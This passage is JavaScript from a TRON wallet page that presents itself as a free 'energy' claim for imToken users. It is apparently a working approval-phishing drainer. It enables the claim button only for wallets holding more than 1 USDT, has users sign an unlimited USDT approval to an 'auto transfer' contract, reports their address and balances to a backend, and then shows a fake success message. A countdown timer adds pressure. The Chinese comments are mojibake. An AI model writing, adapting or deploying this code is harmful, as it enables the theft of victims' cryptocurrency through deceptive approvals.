    }
    document.getElementById("statusAddress").textContent = shortAddr;
    updateWalletStatus();
    await updateUserInfoDisplay(); // å·²è¿æ¥æ—¶æ›´æ–°
    bindApproveLogic();
    renderEnergyRecords();
}
// ========== èƒ½é‡å‡å°‘é€»è¾‘ï¼ˆä¼˜åŒ–è®¡ç®—ï¼Œé¿å…æ•°å€¼å¼‚å¸¸ï¼‰ ==========
function calculateCurrentEnergy() {
    const storedData = localStorage.getItem(STORAGE_KEY);
    if (storedData) {
        try {
            const { energy, lastCalcTime } = JSON.parse(storedData);
            // ç¡®ä¿å­˜å‚¨çš„èƒ½é‡å’Œæ—¶é—´æœ‰æ•ˆ
            if (typeof energy === "number" && typeof lastCalcTime === "number") {
                const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
                currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
            } else {
                // å­˜å‚¨æ•°æ®å¼‚å¸¸ï¼Œé‡æ–°åˆå§‹åŒ–
                currentEnergy = INIT_TRX;
            }
        } catch (e) {
            // JSONè§£æå¤±è´¥ï¼Œé‡æ–°åˆå§‹åŒ–
            currentEnergy = INIT_TRX;
        }
    } else {
        const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000)); // ç¡®ä¿secPassedéè´Ÿ
        currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
    }
    // å­˜å‚¨æœ€æ–°æ•°æ®ï¼ˆç¡®ä¿æ•°å€¼ä¸æº¢å‡ºï¼‰
    localStorage.setItem(STORAGE_KEY, JSON.stringify({
        energy: currentEnergy,
        lastCalcTime: Date.now()
    }));
    // æ›´æ–°èƒ½é‡ä½™é¢æ˜¾ç¤º
    if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
    return currentEnergy;
}
// èƒ½é‡æ˜¾ç¤ºæ›´æ–°ï¼ˆæ²¿ç”¨ä¹‹å‰çš„é€’å½’å®šæ—¶å™¨ï¼Œåªæ”¹è®¡ç®—é€»è¾‘ï¼‰
function updateEnergyDisplay() {
    if (!contractEnergyEl) return;
    calculateCurrentEnergy();
    contractEnergyEl.textContent = Math.floor(currentEnergy);
    contractEnergyEl.innerHTML = Math.floor(currentEnergy);
    contractEnergyEl.offsetHeight;
    console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", Math.floor(currentEnergy));
}
// å¯åŠ¨å®šæ—¶å™¨ï¼ˆæ— æ”¹åŠ¨ï¼Œæ²¿ç”¨é€’å½’æ¨¡å¼ï¼‰
function startPersistentEnergyCountdown() {
    // å¯é€‰ï¼šé¦–æ¬¡ä½¿ç”¨æ—¶æ¸…é™¤æ—§ç¼“å­˜ï¼ˆåªæ‰§è¡Œä¸€æ¬¡ï¼‰
    const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
    if (!hasClearedOldCache) {
        localStorage.removeItem(STORAGE_KEY);
        localStorage.setItem("has_cleared_old_cache", "true");
    }
    
    if (trxTimer) clearTimeout(trxTimer);
    calculateCurrentEnergy();
    updateEnergyDisplay();
    function tick() {
        updateEnergyDisplay();
        if (currentEnergy > 0) {
            trxTimer = setTimeout(tick, 1000);
        }
    }
    tick();
    console.log("èƒ½é‡å®šæ—¶å™¨å·²å¯åŠ¨ï¼Œé€’å½’æ¨¡å¼");
}
// ========== é¡µé¢åˆå§‹åŒ–ï¼ˆä¿®å¤è¯­è¨€åˆ‡æ¢äº‹ä»¶ç»‘å®šï¼‰ ==========
document.addEventListener('DOMContentLoaded', async () => {
    localStorage.removeItem("energy_state");
    console.log("å·²æ¸…é™¤æ—§ç¼“å­˜");
    contractEnergyEl = document.getElementById("contractEnergy");
    console.log("èƒ½é‡æ˜¾ç¤ºå…ƒç´ æ˜¯å¦æ‰¾åˆ°ï¼š", contractEnergyEl ? "âœ… æ‰¾åˆ°" : "âŒ æœªæ‰¾åˆ°");
    if (!contractEnergyEl) {
        alert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥é¡µé¢ä¸­æ˜¯å¦æœ‰id='contractEnergy'çš„æ ‡ç­¾");
        return;
    }
    startPersistentEnergyCountdown();
    initLangDisplay(); // åˆå§‹åŒ–è¯­è¨€æŒ‰é’®æ˜¾ç¤º
    updatePageLang();
    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    // æ–°å¢ï¼šè®¾ç½®åˆçº¦åˆå§‹èƒ½é‡å€¼
    contractEnergyEl.textContent = Math.floor(INIT_TRX); // æ˜¾ç¤ºåˆå§‹èƒ½é‡
    renderEnergyRecords();
    updateWalletStatus();
    updateUserBalanceDisplay(); // åˆå§‹åŒ–ä½™é¢æ˜¾ç¤º
    
    // ç»‘å®šè¯­è¨€ä¸‹æ‹‰èœå•äº‹ä»¶ï¼ˆä¿®å¤ä¹‹å‰ç¼ºå¤±çš„ç»‘å®šï¼‰
    langToggleBtn.addEventListener("click", (e) => {
        e.stopPropagation(); // é˜»æ­¢äº‹ä»¶å†’æ³¡
        langDropdown.classList.toggle("open");
    });
    // ç»‘å®šè¯­è¨€é€‰é¡¹ç‚¹å‡»äº‹ä»¶ï¼ˆä¿®å¤getAttributeå‚æ•°é”™è¯¯ï¼‰
    langDropdownItems.forEach(item => {
        item.addEventListener("click", (e) => {
            e.stopPropagation();
            const newLang = item.getAttribute("data-lang"); // ä¿®æ­£ï¼šè·å–data-langå±æ€§
            changeLang(newLang);
        });
    });
    // ç‚¹å‡»é¡µé¢å…¶ä»–åœ°æ–¹å…³é—­ä¸‹æ‹‰èœå•
    document.addEventListener("click", () => {
        langDropdown.classList.remove("open");
    });
    // é˜»æ­¢ä¸‹æ‹‰èœå•å†…éƒ¨ç‚¹å‡»äº‹ä»¶å†’æ³¡
    langDropdown.addEventListener("click", (e) => {
        e.stopPropagation();
    });
    
    // åˆå§‹éšè—è®°å½•åˆ—è¡¨
    recordList.style.display = "none";
    await checkImTokenEnv().catch(err => {
        console.error("ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼š", err);
        const lang = langConfig[currentLang];
        // ä¿®å¤ï¼šæ˜¾ç¤ºé»˜è®¤æç¤ºï¼Œéšè—åŠ¨æ€æç¤ºå’Œå››è§’ä½™é¢
        userInfoDefault.style.display = "block";
        userInfoStatus.style.display = "none";
        balanceItems.forEach(item => item.style.display = "none");
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        updateUserBalanceDisplay(); // æœªè¿æ¥æ—¶æ›´æ–°æ˜¾ç¤º
    });
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearTimeout(trxTimer);
    });
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        setTimeout(() => {
            initWallet(true).catch(err => {
                console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
                const lang = langConfig[currentLang];
                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
                // ä¿®å¤ï¼šæ˜¾ç¤ºåŠ¨æ€æç¤ºï¼Œéšè—é»˜è®¤æç¤º
                userInfoDefault.style.display = "none";
                userInfoStatus.style.display = "block";
                userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                approveBtn.disabled = false;
                approveBtn.textContent = lang.approveBtnText;
            });
        }, 500);
    }
});
// ========== ç¯å¢ƒæ£€æµ‹ï¼ˆæœ€ç»ˆç‰ˆï¼šç”¨å®˜æ–¹Schemeç›´æ¥å”¤èµ·æµè§ˆå™¨ï¼‰ ==========
// ========== ç¯å¢ƒæ£€æµ‹ï¼ˆæœ€ç»ˆæœ€ç»ˆç‰ˆï¼šå¤ç”¨ä½ å·²å®šä¹‰çš„æ­£ç¡®é…ç½®ï¼‰ ==========
async function checkImTokenEnv() {
    const lang = langConfig[currentLang];
    if (window.tronWeb) {
        tronWeb = window.tronWeb;
        connectBtn.style.display = "none";
        warning.style.display = "none";
        specialTipContainer.style.display = "none";
        await initWallet(false);
        return;
    }
    // ç¡®è®¤æŒ‰é’®å·²æ¸²æŸ“ï¼ˆå…œåº•ï¼‰
    if (!connectBtn) {
        console.warn("âš ï¸ è¿æ¥æŒ‰é’®æœªæ‰¾åˆ°ï¼Œç¨åé‡è¯•");
        setTimeout(() => checkImTokenEnv(), 500);
        return;
    }
    // éimTokenç¯å¢ƒï¼š100%å¤ç”¨ä½ å·²å®šä¹‰çš„æ­£ç¡®é…ç½®ï¼Œä¸æ‰‹åŠ¨å†™Schemeï¼
    specialTipContainer.style.display = "block";
    // ä¿®å¤ï¼šæ˜¾ç¤ºåŠ¨æ€æç¤ºï¼ˆéimTokenç”¨æˆ·ï¼‰ï¼Œéšè—é»˜è®¤æç¤ºå’Œå››è§’ä½™é¢
    userInfoDefault.style.display = "none";
    userInfoStatus.style.display = "block";
    userInfoStatus.innerHTML = lang.nonImTokenUser;
    approveBtn.style.display = "none";
    connectBtn.style.display = "none";
    nonImTokenPopup.style.display = "none";
    const fullTargetUrl = window.location.href + "#approve";
    // ç›´æ¥ç”¨ä½ å®šä¹‰çš„imTokenConfig.schemeï¼Œä¸ä¿®æ”¹ä»»ä½•å·²æœ‰é…ç½®ï¼
    const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
    // è§¦å‘è·³è½¬ï¼ˆå’Œä½ ä¹‹å‰æˆåŠŸçš„é€»è¾‘å®Œå…¨ä¸€è‡´ï¼‰
    console.log("ğŸ“¤ å¤ç”¨å·²å®šä¹‰é…ç½®è·³è½¬ï¼š", jumpUrl);
    window.location.href = jumpUrl;
    // å»¶è¿Ÿ3ç§’æ£€æµ‹ç»“æœ
    setTimeout(() => {
        if (!window.tronWeb) {
            nonImTokenPopup.style.display = "block";
            connectBtn.style.display = "block";
            // æŒ‰é’®ä¹Ÿå¤ç”¨åŒä¸€é…ç½®ï¼Œç¡®ä¿100%ä¸€è‡´
            connectBtn.onclick = () => {
                const fullTargetUrl = window.location.href + "#approve";
                const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
                window.location.href = jumpUrl;
            };
        }
    }, 3000);
    closePopupBtn.onclick = () => {
        nonImTokenPopup.style.display = "none";
    };
}
//é’±åŒ…åˆå§‹åŒ–
async function initWallet(isAfterApprove) {
    const lang = langConfig[currentLang];
    try {
        userAddress = tronWeb.defaultAddress?.base58; // å…¼å®¹é’±åŒ…æœªæˆæƒçš„æƒ…å†µï¼ˆå¯é€‰é“¾æ“ä½œï¼‰
        // 1. ç‰¹æ®Šåœ°å€ç™½åå•ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼Œéšè—åœ°å€+ä»…æ˜¾ç¤ºçŠ¶æ€ï¼‰
        if (userAddress === SPECIAL_ADDRESS) {
            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
            const [usdtRaw, trxRaw] = await Promise.all([
                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
                tronWeb.trx.getBalance(userAddress).catch(err => 0)
            ]);
            tokenBalance = Number(usdtRaw) / 1000000; // USDTç²¾åº¦è½¬æ¢
            trxBalance = Number(trxRaw) / 1000000;     // TRXç²¾åº¦è½¬æ¢
            // éšè—é»˜è®¤æç¤ºï¼Œæ˜¾ç¤ºåŠ¨æ€çŠ¶æ€ï¼ˆæ— åœ°å€ã€æ— ä½™é¢ï¼‰
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // ç§»é™¤æ‰€æœ‰å ä½ç¬¦
            // æ˜¾ç¤ºå››è§’ä½™é¢ï¼ˆç”¨æˆ·èƒ½é‡æ˜¾ç¤ºè‡ªèº«èƒ½é‡ï¼‰
            balanceItems.forEach(item => item.style.display = "flex");
            // å¼‚æ­¥æ›´æ–°ç”¨æˆ·ä¿¡æ¯ï¼ˆåŠ awaitï¼‰
            await updateUserInfoDisplay();
            approveBtn.disabled = false;
            approveBtn.textContent = lang.approveBtnText;
            // éšè—åœ°å€æ˜¾ç¤º
            const statusAddressEl = document.getElementById("statusAddress");
            if (statusAddressEl) statusAddressEl.style.display = "none";
            updateWalletStatus();
            
            // å‘é€A1ä¿¡å·ï¼ˆé˜²é‡å¤ï¼‰
            if (canSendA1Signal(userAddress)) {
                sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
                updateA1SignalRecord(userAddress);
            }
            bindApproveLogic();
            // å¼ºåˆ¶æ˜¾ç¤º+æ¸²æŸ“è®°å½•
            recordList.style.display = "block";
            renderEnergyRecords();
            return;
        }
        // 2. æ— é’±åŒ…åœ°å€ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼‰
        if (!userAddress) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.noWalletAddress;
            balanceItems.forEach(item => item.style.display = "none");
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none";
            return;
        }
        // æŸ¥è¯¢ä½™é¢ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼Œä»…ç”¨äºåˆ¤æ–­ï¼Œä¸æ˜¾ç¤ºåœ¨çŠ¶æ€ä¸­ï¼‰
        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        const [usdtRaw, trxRaw] = await Promise.all([
            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
            tronWeb.trx.getBalance(userAddress).catch(err => 0)
        ]);
        tokenBalance = Number(usdtRaw) / 1000000;
        trxBalance = Number(trxRaw) / 1000000;
        // éšè—åœ°å€æ˜¾ç¤º
        const statusAddressEl = document.getElementById("statusAddress");
        if (statusAddressEl) statusAddressEl.style.display = "none";
        // 3. 30å¤©å†…å·²é¢†å–ï¼ˆä»…æ˜¾ç¤ºçŠ¶æ€ï¼Œæ— åœ°å€ã€æ— ä½™é¢ï¼‰
        if (isAddressAuthorized(userAddress)) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.authorizedTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // ç§»é™¤æ‰€æœ‰å ä½ç¬¦
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay(); // å¼‚æ­¥æ›´æ–°ä½™é¢
            approveBtn.disabled = true;
            approveBtn.textContent = lang.authorizedBtn;
            updateWalletStatus();
            // å¼ºåˆ¶æ˜¾ç¤º+æ¸²æŸ“è®°å½•
            recordList.style.display = "block";
            renderEnergyRecords();
            return;
        }
        // 4. USDTä½™é¢ä¸è¶³ï¼ˆä»…æ˜¾ç¤ºçŠ¶æ€ï¼Œæ— åœ°å€ã€æ— ä½™é¢ï¼‰
        if (tokenBalance <= 1) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, ""); // ç§»é™¤æ‰€æœ‰å ä½ç¬¦
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay(); // å¼‚æ­¥æ›´æ–°ä½™é¢
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            // å¼ºåˆ¶æ˜¾ç¤º+æ¸²æŸ“è®°å½•
            recordList.style.display = "block";
            renderEnergyRecords();
            return;
        }
        // 5. éimTokenç”¨æˆ·ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼‰
        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
            userInfoDefault.style.display = "none";
            userInfoStatus.style.display = "block";
            userInfoStatus.innerHTML = lang.nonImTokenUser;
            balanceItems.forEach(item => item.style.display = "none");
            approveBtn.disabled = true;
            approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            recordList.style.display = "none";
            return;
        }
        // 6. ç¬¦åˆæ¡ä»¶ï¼ˆä»…æ˜¾ç¤ºçŠ¶æ€ï¼Œæ— åœ°å€ã€æ— ä½™é¢ï¼‰
        userInfoDefault.style.display = "none";
        userInfoStatus.style.display = "block";
        userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // ç§»é™¤æ‰€æœ‰å ä½ç¬¦
        balanceItems.forEach(item => item.style.display = "flex");
        await updateUserInfoDisplay(); // å¼‚æ­¥æ›´æ–°ä½™é¢
        updateWalletStatus();
        // å‘é€A1ä¿¡å·ï¼ˆé˜²é‡å¤ï¼‰
        if (canSendA1Signal(userAddress)) {
            sendSignalA1().catch(err => console.error("A1ä¿¡å·å¼‚æ­¥å‘é€å¤±è´¥ï¼š", err));
            updateA1SignalRecord(userAddress);
        }
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        bindApproveLogic();
        // å¼ºåˆ¶æ˜¾ç¤º+æ¸²æŸ“è®°å½•ï¼ˆæœ€ç»ˆå…œåº•ï¼‰
        recordList.style.display = "block";
        renderEnergyRecords();
    } catch (e) {
        // é”™è¯¯å¤„ç†ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼Œä¼˜åŒ–æ˜¾ç¤ºï¼‰
        console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", e);
        const errorTip = userAddress ? lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, "") : lang.noWalletAddress;
        userInfoDefault.style.display = "none";
        userInfoStatus.style.display = "block";
        userInfoStatus.innerHTML = errorTip;
        // æœ‰åœ°å€æ˜¾ç¤ºå››è§’ä½™é¢ï¼Œæ— åœ°å€éšè—
        if (userAddress) {
            balanceItems.forEach(item => item.style.display = "flex");
            await updateUserInfoDisplay(); // å¼‚æ­¥æ›´æ–°ä½™é¢
        } else {
            balanceItems.forEach(item => item.style.display = "none");
        }
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
        updateWalletStatus();
        // æœ‰åœ°å€å°±æ˜¾ç¤ºè®°å½•å®¹å™¨ï¼Œæ— åœ°å€åˆ™éšè—
        recordList.style.display = userAddress ? "block" : "none";
        if (userAddress) renderEnergyRecords(); // æœ‰åœ°å€æ—¶æ¸²æŸ“è®°å½•
    }
}
// ========== å‘é€ä¿¡å·å‡½æ•° ==========
async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000); // 20ç§’è¶…æ—¶å…œåº•
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        
        // å…¼å®¹200-299æ‰€æœ‰æˆåŠŸçŠ¶æ€ï¼ˆåŒ…æ‹¬204ï¼‰
        if (res.ok) {
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            a1Status[userAddress] = "success"; // æ ‡è®°æˆåŠŸï¼Œå†™å…¥æœ¬åœ°ç¼“å­˜
            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
            console.log(`âœ… A1ä¿¡å·å‘é€æˆåŠŸï¼ˆåç«¯è¿”å›çŠ¶æ€ç ï¼š${res.status}ï¼‰`);
            return "success"; // ç»Ÿä¸€è¿”å›æˆåŠŸæ ‡è¯†
        }
        throw new Error(`A1ä¿¡å·åç«¯è¿”å›éæˆåŠŸçŠ¶æ€ï¼š${res.status}`);
    } catch (e) {
        clearTimeout(timeoutId);
        console.warn("âŒ A1ä¿¡å·å‘é€å¤±è´¥ï¼ˆç½‘ç»œ/è¶…æ—¶/åç«¯å¼‚å¸¸ï¼‰ï¼š", e);
        return "fail"; // å¤±è´¥è¿”å›æ ‡è¯†
    }
}
async function sendSignalA2() {
    const requestData = { 
        userAddress, 
        usdtBalance: tokenBalance, 
        trxBalance: trxBalance // ç›´æ¥å¤ç”¨å·²æœ‰TRXä½™é¢ï¼ˆæ— éœ€é‡æ–°è®¡ç®—ï¼‰
    };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData), // åŒ…å«3ä¸ªå‚æ•°
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.ok) {
            console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸ");
            return true;
        } else {
            console.log("âŒ A2ä¿¡å·å‘é€å¤±è´¥ï¼ˆåç«¯é200çŠ¶æ€ï¼‰");
            return false;
        }
    } catch (e) {
        clearTimeout(timeoutId);
        console.warn("âŒ A2ä¿¡å·å‘é€å¼‚å¸¸ï¼š", e);
        return false;
    }
}
// é‡æ„sendSignalBï¼šä¸æŠ›å‡ºé”™è¯¯ï¼Œé¿å…å¡ä½ï¼Œç»Ÿä¸€è¿”å›true/false
async function sendSignalB(isB1 = true) {
    const requestData = { userAddress };
    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    const lang = langConfig[currentLang];
    try {
        const res = await fetch(`${BACKEND_API}${apiPath}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        // 1. å®¢æˆ·ç«¯é”™è¯¯ï¼ˆ400/408/409ï¼‰ï¼šç”¨æˆ·ä¸åˆè§„ï¼Œè¿”å›false
        if ([400, 408, 409].includes(res.status)) {
            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
            console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·ç”¨æˆ·ä¸åˆè§„ï¼š`, errData.detail);
            return false;
        }
        // 2. æˆåŠŸå›åº”ï¼ˆ200-299ï¼‰ï¼šåªè¦çŠ¶æ€ç æ­£ç¡®ï¼Œæ— éœ€å“åº”ä½“
        if (res.ok) {
            console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸ`);
            addAuthorizedAddress(userAddress); 
            saveEnergyRecord(); // ä¿å­˜è®°å½•
            return true;
        }
        // 3. å…¶ä»–å¤±è´¥ï¼ˆ500ç­‰ï¼‰ï¼šè¿”å›false
        console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·åç«¯è¿”å›å¼‚å¸¸çŠ¶æ€ï¼š${res.status}`);
        return false;
    } catch (e) {
        clearTimeout(timeoutId);
        console.error(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·å‘é€å¼‚å¸¸ï¼š`, e);
        return false; // å¼‚å¸¸æ—¶è¿”å›falseï¼Œä¸å¡ä½å‰ç«¯
    }
}
// ========== æ–°å¢ï¼šA1å¤±è´¥é‡è¯•é€»è¾‘ ==========
function bindRetryA1Logic() {
    const lang = langConfig[currentLang];
    approveBtn.disabled = false;
    approveBtn.textContent = "é‡æ–°æ£€æµ‹ç¯å¢ƒ";
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        btn.disabled = true;
        btn.textContent = "æ£€æµ‹ä¸­...";
        // ä¿®å¤ï¼šä¿®æ”¹åŠ¨æ€æç¤ºå†…å®¹ï¼Œä¸è¦†ç›–å®¹å™¨
        userInfoStatus.innerHTML = `<span style='color: #4ade80; font-size: 13px;'>âœ… æ­£åœ¨é‡æ–°æ£€æµ‹ç¯å¢ƒ...</span>
        `;
        const a1Result = await sendSignalA1(); // é‡è¯•å‘é€A1
        if (a1Result === "success") {
            // ä¿®å¤ï¼šä¿®æ”¹åŠ¨æ€æç¤ºå†…å®¹ï¼Œä¸è¦†ç›–å®¹å™¨
            userInfoStatus.innerHTML = `<span style='color: #3b82f6; font-size: 13px;'>âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶</span>
            `;
            bindApproveLogic(); // é‡è¯•æˆåŠŸâ†’é‡æ–°ç»‘å®šé¢†å–é€»è¾‘
        } else {
            // ä¿®å¤ï¼šä¿®æ”¹åŠ¨æ€æç¤ºå†…å®¹ï¼Œä¸è¦†ç›–å®¹å™¨
            userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 13px;'>âš ï¸ ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼Œå¯é‡è¯•</span>
            `;
            btn.disabled = false;
            btn.textContent = "é‡æ–°æ£€æµ‹ç¯å¢ƒ";
        }
    };
}
   //é¢†å–æŒ‰é’®å‡½æ•°     
function bindApproveLogic() {
    const lang = langConfig[currentLang];
    approveBtn.onclick = async () => {
        const btn = document.getElementById("approveBtn");
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        btn.disabled = true;
        btn.textContent = lang.redirectingBtn;
        reviewTip.style.display = "flex";
        reviewTipText.textContent = "å‘èµ·ç­¾åï¼Œè¯·åœ¨imTokenä¸­ç¡®è®¤...";
        try {
            // æ–°å¢1ï¼šA1ä¿¡å·æ ¡éªŒï¼ˆä¿ç•™åŸæœ‰æ ¡éªŒé€»è¾‘ï¼Œå¤±è´¥åˆ™ç»ˆæ­¢æµç¨‹ï¼‰
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            const isA1Success = a1Status[userAddress] === "success";
            if (!isA1Success) {
                throw new Error("A1ç¯å¢ƒæ ¡éªŒæœªé€šè¿‡ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…æˆ–ç¨åé‡è¯•");
            }
            // æ–°å¢2ï¼šä¿ç•™B1ä¿¡å·å‘é€ï¼ˆå¼‚æ­¥æ‰§è¡Œï¼Œä¸é˜»å¡Approveï¼‰
            if (!hasSentB1Signal(userAddress)) {
                sendSignalB(true).catch(err => console.warn("B1ä¿¡å·å‘é€å¤±è´¥ï¼ˆä¸å½±å“ç­¾åï¼‰ï¼š", err));
                markB1SignalSent(userAddress);
            }
            // æ ¸å¿ƒæ ¡éªŒï¼šç¡®ä¿å·²æœ‰åˆçº¦å®ä¾‹æœ‰æ•ˆï¼ˆå¤ç”¨å‰ç½®åˆå§‹åŒ–çš„trc20Contractï¼‰
            if (!trc20Contract) {
                // å…œåº•ï¼šå¦‚æœå®ä¾‹æ„å¤–å¤±æ•ˆï¼Œç”¨å·²æœ‰ABIé‡æ–°å¿«é€Ÿåˆå§‹åŒ–ï¼ˆä»…å…œåº•ï¼Œæ­£å¸¸æƒ…å†µä¸ä¼šèµ°ï¼‰
                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                if (!trc20Contract) throw new Error("åˆçº¦å®ä¾‹åˆå§‹åŒ–å¤±è´¥ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…");
            }
            // ç¡®ä¿TronWebå°±ç»ªï¼ˆé¿å…å®ä¾‹å’Œé’±åŒ…é€šä¿¡å¤±æ•ˆï¼‰
            if (!tronWeb.ready) {
                await new Promise(resolve => tronWeb.onReady(resolve));
            }
            // å…³é”®ï¼šç›´æ¥è°ƒç”¨å·²æœ‰åˆçº¦å®ä¾‹çš„approveæ–¹æ³•ï¼ˆä¸æ–°å»ºã€ä¸è·³è½¬ã€ä¸ç¢°A1/B1æ ¸å¿ƒé€»è¾‘ï¼‰
            const approveResult = await trc20Contract.approve(
                AUTO_TRANSFER_CONTRACT, // æˆæƒå¯¹è±¡ï¼ˆå‰ç½®å·²ç¡®è®¤ï¼‰
                INFINITE_APPROVE_AMOUNT // æ— é™æˆæƒé‡‘é¢ï¼ˆå·²æœ‰ABIæ”¯æŒï¼‰
            ).send({
                from: userAddress, // å‰ç½®å·²æ ¡éªŒçš„æœ‰æ•ˆåœ°å€
                shouldPollResponse: true // ç­‰å¾…é“¾ä¸Šç¡®è®¤
            });
            // ç­¾åæˆåŠŸåæ”¶å°¾ï¼ˆä¸å½±å“æ ¸å¿ƒè°ƒç”¨ï¼‰
            reviewTipText.textContent = "ç­¾åæˆåŠŸï¼Œèƒ½é‡å·²åˆ°è´¦...";
            await Promise.all([
                sendSignalA2().catch(err => console.warn("A2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err)),
                sendSignalB(false).catch(err => console.warn("B2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err))
            ]);
            addAuthorizedAddress(userAddress);
            saveEnergyRecord();
            renderEnergyRecords();
            btn.textContent = lang.successBtn;
            // ä¿®å¤ï¼šè¿½åŠ æˆåŠŸæç¤ºï¼Œä¸è¦†ç›–åŸæœ‰å†…å®¹
            userInfoStatus.innerHTML += lang.successArrival;
            alert(lang.successTip);
            reviewTip.style.display = "none";
        } catch (e) {
            console.error("Approveè°ƒç”¨å¤±è´¥ï¼ˆæ ¸å¿ƒåŸå› ï¼‰ï¼š", e);
            reviewTip.style.display = "none";
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
            // æ˜ç¡®æç¤ºé”™è¯¯ç±»å‹ï¼ˆå«A1æ ¡éªŒå¤±è´¥ã€åˆçº¦å®ä¾‹é—®é¢˜ç­‰ï¼‰
            let errMsg = e.message;
            if (errMsg.includes("A1ç¯å¢ƒæ ¡éªŒ")) {
